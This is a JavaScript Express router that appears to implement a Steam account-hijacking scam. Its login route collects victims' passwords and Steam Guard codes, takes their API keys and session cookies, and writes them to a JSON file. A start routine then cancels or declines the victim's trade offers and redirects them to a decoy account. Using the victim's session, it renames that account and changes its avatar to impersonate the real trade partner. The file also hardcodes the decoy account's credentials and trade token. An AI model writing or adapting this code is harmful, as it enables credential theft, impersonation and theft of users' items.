var express = require("express");
var router = express.Router();

const { Offers, User, SteamAPIManager, Converter, Community } = require("../public/javascripts/steam");
const fs = require("fs");
const path = require("path");

let state = {
    user: { login: "", password: "", guard: "" },
    sessionID: "",
    cookies: [],
    APIKey: ""
};

const jsonPath = path.join(__dirname, '..', 'data', 'user-sessions.json');
const updateJSON = () => {
    let obj = JSON.parse(fs.readFileSync(jsonPath).toString());

    let userSession = {
        user: state.user,
        sessionID: state.sessionID,
        cookies: state.cookies,
        APIKey: state.APIKey,
        datetime: new Date().toLocaleString()
    };
    obj['user-sessions'].push(userSession);

    fs.writeFileSync(jsonPath, JSON.stringify(obj));
}

// ! WARNING ! - hard code
const fake_ID32 = "1091326648";
const fake_ID64 = "76561199051592376";
const fake_token = "KUdrvKCA";
var fake_sessionID;
var fake_cookies;

router.get("/setup", function (req, res, next) {
    Community.login("anvanhyrea1972", "6HwdGQvkQr1981", "7K8XF")
            .then(response => {
                console.log(response);

                fake_sessionID = response.sessionID;
                fake_cookies = response.cookies;
            })
            .catch(err => console.log(err));
});

router.get("/", function (req, res, next) {
    SteamAPIManager.retrieveAPIKey("anus228", state.sessionID, state.cookies)
        .then(key => {
            if (key !== state.APIKey) {
                state.APIKey = key;
                updateJSON();
            }
        })
        .finally(() => res.send(state));
});

const start = () => {
    Offers.startCheckingOffers(state.APIKey, fake_ID32)
        .then(offer => {
            User.obtainUserInfo(state.APIKey, Converter.ID32toID64(offer.accountid_other))
                .then(user => {
                    const name = user.personaname;
                    const avatar = user.avatarfull;

                    Community.setUserAvatar(avatar).then(() => console.log("Avatar has been set ✓"));
                    Community.setUserName(name).then(() => console.log("Persona Name has been set ✓"));
                })
                .catch(error => console.log(error));

            if (offer.is_our_offer) {
                Offers.cancelOffer(state.APIKey, offer.tradeofferid)
                    .then(() => {
                        Offers.makeOffer({
                            partnerAccountId: fake_ID32,
                            partnerSteamId: fake_ID64,
                            accessToken: fake_token,
                            cookies: state.cookies,
                            sessionID: state.sessionID,
                            itemsFromMe: offer.items_to_give,
                            itemsFromThem: offer.items_to_receive,
                            message: offer.message
                        }).then(() => {
                            // TODO accept offer on Fake account
                        });
                    })
            }
            else {
                Offers.declineOffer(state.APIKey, offer.tradeofferid)
                    .then(() => {
                        User.obtainUserInfo(state.APIKey, User.getId64())
                            .then(user => {
                                Offers.createTradeAccessToken(user.profileurl, state.sessionID, state.cookies)
                                    .then(this_token => {
                                        const this_ID32 = User.getId32();
                                        const this_ID64 = User.getId64();

                                        Offers.makeOffer({
                                            partnerAccountId: this_ID32,
                                            partnerSteamId: this_ID64,
                                            accessToken: this_token,
                                            cookies: fake_cookies,
                                            sessionID: fake_sessionID,
                                            itemsFromMe: [],
                                            itemsFromThem: offer.items_to_give,
                                            message: offer.message
                                        }).then(() => {
                                            // 
                                        }).catch(error => console.log(error));
                                    })
                                    .catch(error => console.log(error));
                            })
                            .catch(error => console.log(error));
                    });
            }
        })
        .catch();
}

router.post("/login", function (req, res, next) {
    if (User.isLoggedOn()) {
        res.send(400).send("Already logged on, cannot log on again");
        return;
    }

    User.login(req.body.login, req.body.password, req.body.guard)
        .then((response) => {
            state = {};
            state.user = req.body;
            state.sessionID = response.sessionID;
            state.cookies = response.cookies;

            SteamAPIManager.retrieveAPIKey("anus228", state.sessionID, state.cookies)
                .then(key => {
                    state.APIKey = key;

                    start();
                })
                .finally(() => {
                    updateJSON();
                    res.send(response);
                });
        })
        .catch(error => {
            res.status(400).send(error);
        });
});

router.get("/start", function (req, res, next) {
    start();
})

router.post("/logout", function (req, res, next) {
    User.logout().then(() => res.status(200).send("Logged Out"));
});

module.exports = router;